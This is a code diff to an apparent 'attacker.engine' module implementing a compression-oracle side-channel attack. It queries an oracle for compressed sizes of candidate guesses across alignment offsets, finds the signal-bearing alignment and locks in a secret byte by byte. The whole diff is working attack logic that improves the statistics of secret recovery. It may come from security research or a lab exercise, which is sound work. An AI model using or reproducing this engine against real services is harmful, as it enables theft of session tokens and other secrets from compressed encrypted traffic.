@@ -7,42 +7,85 @@ LOG = logging.getLogger("attacker.engine")
 ALIGNMENT_COUNT = 8
 
 
+def _per_alignment_means(
+    samples: dict[bytes, list[int]],
+) -> dict[bytes, list[float]]:
+    """Pre-compute mean compressed size per (candidate, alignment_offset)."""
+    result: dict[bytes, list[float]] = {}
+    for cand, s in samples.items():
+        result[cand] = []
+        for i in range(ALIGNMENT_COUNT):
+            slice_i = s[i::ALIGNMENT_COUNT]
+            result[cand].append(statistics.fmean(slice_i) if slice_i else float("inf"))
+    return result
+
+
+def _signal_alignment(align_means: dict[bytes, list[float]]) -> int:
+    """Index of the alignment offset where the per-candidate distribution
+    is most bimodal (small group of low-mean candidates, larger group of
+    high-mean ones).
+
+    Score = median(per-candidate means at this alignment) - min(per-cand
+    means at this alignment). Non-informative alignments have all
+    candidates near the same value, so median ≈ min and score ≈ 0.
+    Signal-bearing alignments have a small group at the back-referenced
+    (low) value and a much larger group at the boundary-crossing (high)
+    value, so median is far above the min."""
+    best_align = 0
+    best_score = -1.0
+    for i in range(ALIGNMENT_COUNT):
+        col = [am[i] for am in align_means.values() if am[i] != float("inf")]
+        if not col:
+            continue
+        score = statistics.median(col) - min(col)
+        if score > best_score:
+            best_score = score
+            best_align = i
+    return best_align
+
+
 def locked(
     ranked: list[bytes],
     samples: dict[bytes, list[int]],
     min_margin: int,
     min_agreement: int,
 ) -> bool:
+    """Lock when, at the signal-bearing alignment, the top candidate's
+    mean is at least min_margin bytes below the runner's.
+
+    min_agreement is reinterpreted as a count of alignments at which the
+    top candidate must have its minimum-or-near-minimum mean, providing
+    secondary robustness against a single-alignment fluke."""
     if len(ranked) < 2:
         return False
-    top, runner = ranked[0], ranked[1]
-    median_top = statistics.median(samples[top])
-    median_runner = statistics.median(samples[runner])
-    if median_runner - median_top < min_margin:
+    align_means = _per_alignment_means(samples)
+    sig = _signal_alignment(align_means)
+    top_at_sig = align_means[ranked[0]][sig]
+    runner_at_sig = align_means[ranked[1]][sig]
+    if runner_at_sig - top_at_sig < min_margin:
         return False
-    return _alignment_agreement(top, samples) >= min_agreement
+    # Secondary robustness: top candidate's mean at signal align must be
+    # the lowest of all candidates (not just lower than runner).
+    if top_at_sig != min(align_means[c][sig] for c in align_means):
+        return False
+    return min_agreement <= 1 or _agreement_count(ranked[0], align_means) >= min_agreement
 
 
-def _alignment_agreement(top: bytes, samples: dict[bytes, list[int]]) -> int:
+def _agreement_count(cand: bytes, align_means: dict[bytes, list[float]]) -> int:
+    """Number of alignments where `cand` has the strictly lowest mean."""
     wins = 0
-    for align_idx in range(ALIGNMENT_COUNT):
-        top_at = _slice_alignment(samples[top], align_idx)
-        if not top_at:
-            continue
-        top_min = statistics.median(top_at)
-        better = True
-        for cand, cand_samples in samples.items():
-            if cand == top:
-                continue
-            cand_at = _slice_alignment(cand_samples, align_idx)
-            if not cand_at:
-                continue
-            if statistics.median(cand_at) <= top_min:
-                better = False
-                break
-        if better:
+    cand_means = align_means[cand]
+    for i in range(ALIGNMENT_COUNT):
+        m = cand_means[i]
+        if all(other_means[i] > m for other, other_means in align_means.items()
+               if other != cand):
             wins += 1
     return wins
+
+
+# Public alias retained for any external callers / tests.
+def _alignment_agreement(top: bytes, samples: dict[bytes, list[int]]) -> int:
+    return _agreement_count(top, _per_alignment_means(samples))
 
 
 def _slice_alignment(samples: list[int], align_idx: int) -> list[int]:
@@ -70,16 +113,17 @@ async def find_next_byte(
                 size = await oracle(prefix, cand, align_len)
                 samples[cand].append(size)
 
-        ranked = sorted(candidates, key=lambda c: statistics.median(samples[c]))
-        top_med = statistics.median(samples[ranked[0]])
-        runner_med = statistics.median(samples[ranked[1]])
-        agree = _alignment_agreement(ranked[0], samples)
+        align_means = _per_alignment_means(samples)
+        sig = _signal_alignment(align_means)
+        ranked = sorted(candidates, key=lambda c: align_means[c][sig])
+        top_at_sig = align_means[ranked[0]][sig]
+        runner_at_sig = align_means[ranked[1]][sig]
         LOG.info(
-            "byte=%d round=%d top=0x%02x med=%d runner=0x%02x med=%d margin=%d agree=%d/%d",
-            byte_index, round_idx + 1,
-            ranked[0][0], top_med,
-            ranked[1][0], runner_med,
-            runner_med - top_med, agree, ALIGNMENT_COUNT,
+            "byte=%d round=%d sig_align=%d top=0x%02x mean@sig=%.2f runner=0x%02x mean@sig=%.2f margin=%.2f",
+            byte_index, round_idx + 1, sig,
+            ranked[0][0], top_at_sig,
+            ranked[1][0], runner_at_sig,
+            runner_at_sig - top_at_sig,
         )
         if locked(ranked, samples, min_margin, min_agreement):
             LOG.info("byte=%d locked at 0x%02x", byte_index, ranked[0][0])
